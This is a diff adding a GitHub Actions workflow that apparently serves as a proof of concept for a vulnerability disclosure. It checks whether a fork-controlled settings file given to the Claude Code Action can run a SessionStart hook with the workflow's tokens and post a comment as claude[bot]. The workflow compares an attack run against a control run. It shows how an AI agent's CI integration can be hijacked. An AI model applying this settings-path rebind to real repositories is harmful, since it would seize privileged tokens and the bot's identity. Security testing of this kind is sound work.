@@ -1,0 +1,141 @@
+name: Claude Action settings path rebind
+
+run-name: >-
+  Settings path
+  ${{ contains(github.event.comment.body, '@claude-settings-control') && 'control' || 'attack' }}
+  on PR #${{ github.event.issue.number }}
+
+on:
+  issue_comment:
+    types: [created]
+
+jobs:
+  settings-path-rebind:
+    if: >-
+      github.event.issue.pull_request &&
+      github.actor == 'marcelhacks' &&
+      (
+        contains(github.event.comment.body, '@claude-settings-attack') ||
+        contains(github.event.comment.body, '@claude-settings-control')
+      )
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      pull-requests: write
+      issues: write
+      id-token: write
+    steps:
+      - name: Check out trusted base branch
+        uses: actions/checkout@v6
+        with:
+          fetch-depth: 1
+
+      - name: Materialize trusted control before the Action
+        shell: bash
+        run: |
+          set -euo pipefail
+          git show HEAD:.github/claude-settings.json \
+            > "$RUNNER_TEMP/trusted-claude-settings.json"
+          echo "trusted_base_commit=$(git rev-parse HEAD)"
+          echo "trusted_settings_sha256=$(
+            sha256sum "$RUNNER_TEMP/trusted-claude-settings.json" |
+              cut -d' ' -f1
+          )"
+          test "$(jq -c . "$RUNNER_TEMP/trusted-claude-settings.json")" = '{}'
+
+      - name: Run pinned Claude Code Action
+        id: claude
+        continue-on-error: true
+        uses: anthropics/claude-code-action@44423bdec74b97d67543eb16c110546762c110b2
+        with:
+          anthropic_api_key: settings-path-invalid-key
+          settings: >-
+            ${{ contains(github.event.comment.body, '@claude-settings-control')
+              && format('{0}/trusted-claude-settings.json', runner.temp)
+              || '.github/claude-settings.json' }}
+          claude_args: >-
+            --max-turns 1
+            --tools ""
+            --debug-file /tmp/claude-settings-debug.log
+
+      - name: Verify live attack or control
+        if: always()
+        shell: bash
+        env:
+          GH_TOKEN: ${{ github.token }}
+          CONTROL: ${{ contains(github.event.comment.body, '@claude-settings-control') }}
+        run: |
+          set -euo pipefail
+
+          run_id="$GITHUB_RUN_ID"
+          proof_file="/tmp/claude-settings-hook-${run_id}.json"
+          generated_settings="$HOME/.claude/settings.json"
+          expected="[claude settings-path PoC] fork-controlled SessionStart executed before model completion in run ${run_id}."
+
+          echo "action_outcome=${{ steps.claude.outcome }}"
+          echo "checked_out_commit=$(git rev-parse HEAD)"
+          echo "checked_out_branch=$(git branch --show-current)"
+          echo "worktree_settings_sha256=$(
+            sha256sum .github/claude-settings.json |
+              cut -d' ' -f1
+          )"
+          echo "generated_user_settings=$generated_settings"
+          echo "generated_user_settings_sha256=$(
+            sha256sum "$generated_settings" |
+              cut -d' ' -f1
+          )"
+
+          comments="$(
+            gh api \
+              "repos/$GITHUB_REPOSITORY/issues/${{ github.event.issue.number }}/comments?per_page=100"
+          )"
+          comment_id="$(
+            jq -r --arg body "$expected" \
+              '.[] | select(.body == $body and .user.login == "claude[bot]") | .id' \
+              <<<"$comments" |
+              tail -1
+          )"
+
+          if [[ "$CONTROL" == "true" ]]; then
+            test ! -e "$proof_file"
+            test -z "$comment_id"
+            test "$(jq -c '.hooks // {}' "$generated_settings")" = '{}'
+            echo "CONTROL_NO_EXECUTION_CONFIRMED"
+            exit 0
+          fi
+
+          test -f "$proof_file"
+          jq -e '
+            .event == "SessionStart" and
+            .github_token_present == true and
+            .gh_token_present == true and
+            .token_hashes_equal == true and
+            .comment.author == "claude[bot]" and
+            (.comment.id | type == "number")
+          ' "$proof_file"
+          jq -e '
+            .hooks.SessionStart[0].hooks[0].command ==
+              "python3 \"$GITHUB_WORKSPACE/poc/settings-hook.py\""
+          ' "$generated_settings"
+          test -n "$comment_id"
+          test "$comment_id" = "$(jq -r '.comment.id' "$proof_file")"
+
+          jq '{
+            event,
+            run_id,
+            cwd,
+            settings_source,
+            settings_source_sha256,
+            generated_user_settings,
+            generated_user_settings_sha256,
+            github_token_present,
+            gh_token_present,
+            github_token_sha256,
+            gh_token_sha256,
+            token_hashes_equal,
+            comment
+          }' "$proof_file"
+          echo "authenticated_comment_id=$comment_id"
+          echo "authenticated_comment_author=claude[bot]"
+          echo "ATTACK_SESSIONSTART_APP_TOKEN_EXECUTION_CONFIRMED"
+
